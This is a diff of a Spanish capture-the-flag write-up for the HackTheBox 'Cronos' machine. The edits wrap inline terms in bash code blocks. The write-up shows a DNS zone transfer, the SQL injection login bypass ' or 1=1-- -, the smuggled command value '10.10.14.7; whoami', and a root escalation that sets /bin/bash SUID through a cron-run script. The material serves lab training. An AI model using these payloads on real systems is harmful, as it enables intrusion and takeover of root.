@@ -69,7 +69,11 @@ Lanzamos un web scan con nmap.
 nmap --script http-enum -p80 10.10.10.143 -oN webScan
 ```
 
-Vemos que hay un `/phpmyadmin`
+Vemos que hay un 
+```bash
+ /phpmyadmin 
+```
+
 
 #### Analyzando la web con Firefox {-}
 
@@ -87,9 +91,21 @@ nslookup
 13.10.10.10.in-addr.arpa    name = ns1.cronos.htb
 ```
 
-Vemos un dominio `cronos.htb` y lo añadimos a nuestro `/etc/hosts`
+Vemos un dominio 
+```bash
+ cronos.htb 
+```
+ y lo añadimos a nuestro 
+```bash
+ /etc/hosts 
+```
 
-Si lanzamos Firefox con la url `http://cronos.htb` vemos una pagina differente de la pagina apache2 por defecto, lo que
+
+Si lanzamos Firefox con la url 
+```bash
+ http://cronos.htb 
+```
+ vemos una pagina differente de la pagina apache2 por defecto, lo que
 significa que estamos en frente de un **virtualhost**
 
 Vamos a intentar hacer ataques de transferencia de zona
@@ -103,13 +119,25 @@ dig @10.10.10.13 cronos.htb mx
 dig @10.10.10.13 cronos.htb axfr
 ```
 
-Aqui vemos que es vulnerable a ataques **AXFR** y vemos otro dominio `admin.cronos.htb` que añadimos al `/etc/hosts`.
+Aqui vemos que es vulnerable a ataques **AXFR** y vemos otro dominio 
+```bash
+ admin.cronos.htb 
+```
+ que añadimos al 
+```bash
+ /etc/hosts 
+```
+.
 
 Si visitamos esta nueva web con Firefox vemos un panel de inicio de session.
 
 ### SQL Injection {-}
 
-En el UserName si le ponemos la injeccion SQL basica `' or 1=1-- -` y le damos a submit, entramos directamente en el panel
+En el UserName si le ponemos la injeccion SQL basica 
+```bash
+ ' or 1=1-- - 
+```
+ y le damos a submit, entramos directamente en el panel
 de administracion.
 
 Como sabemos que esta vulnerable a injeccion SQL, probamos differentes cosas porque lo que nos interesa es tener usuarios y contrañas.
@@ -188,7 +216,11 @@ if __name__ == '__main__':
     makeRequest()
 ```
 
-Aqui vemos que la base de datos se llama `admin`. Buscamos ahora el nombre de la tabla.
+Aqui vemos que la base de datos se llama 
+```bash
+ admin 
+```
+. Buscamos ahora el nombre de la tabla.
 
 ```python
 #!/usr/bin/python3
@@ -246,7 +278,11 @@ if __name__ == '__main__':
     makeRequest()
 ```
 
-Ahora que sabemos que hay una tabla `users`, miramos las columnas.
+Ahora que sabemos que hay una tabla 
+```bash
+ users 
+```
+, miramos las columnas.
 
 ```python
 #!/usr/bin/python3
@@ -375,7 +411,11 @@ La pagina web permite enviar ping a maquinas. Lo intentamos contra nuestra maqui
 
 Y recibimos la traza.
 
-Miramos si la web esta bien sanitizada mirando si poniendole `10.10.14.7; whoami` no salimos del contexto y es el caso.
+Miramos si la web esta bien sanitizada mirando si poniendole 
+```bash
+ 10.10.14.7; whoami 
+```
+ no salimos del contexto y es el caso.
 Vamos a ganar accesso al systema.
 ## Vuln exploit & Gaining Access {-}
 
@@ -492,7 +532,11 @@ while true; do
 done
 ```
 
-Y lo ejecutamos. Vemos que hay una tarea que ejecuta un script llamado artisan en **php**. Haciendole un `ls -l` nos damos cuenta que
+Y lo ejecutamos. Vemos que hay una tarea que ejecuta un script llamado artisan en **php**. Haciendole un 
+```bash
+ ls -l 
+```
+ nos damos cuenta que
 el proprietario del script es **www-data**. Imaginamos que el que lanza el script es root. vamos a modificar el script.
 
 ```php
@@ -501,7 +545,11 @@ el proprietario del script es **www-data**. Imaginamos que el que lanza el scrip
 ?>
 ```
 
-Esperamos que la tarea se ejecute con `watch -n 1 ls -l /bin/bash` y pasa a ser SUID
+Esperamos que la tarea se ejecute con 
+```bash
+ watch -n 1 ls -l /bin/bash 
+```
+ y pasa a ser SUID
 
 ```bash
 bash -p
